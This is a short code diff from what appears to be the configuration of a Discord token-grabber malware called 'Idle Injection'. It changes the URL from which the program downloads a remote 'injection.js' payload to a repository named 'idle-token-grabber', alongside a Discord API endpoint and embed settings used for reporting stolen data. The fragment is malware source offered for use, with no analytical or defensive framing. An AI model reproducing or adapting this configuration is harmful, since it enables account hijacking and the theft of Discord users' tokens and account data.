@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Idle Injection', 
   embed_icon: 'https://i.ibb.co/85J4tRc/download.jpg'.replace(/ /g, '%20'),
   embed_color: 8323327, 
-  injection_url: 'https://raw.githubusercontent.com/KingKrex70/Discord-Injection/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/neverantia/idle-token-grabber/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
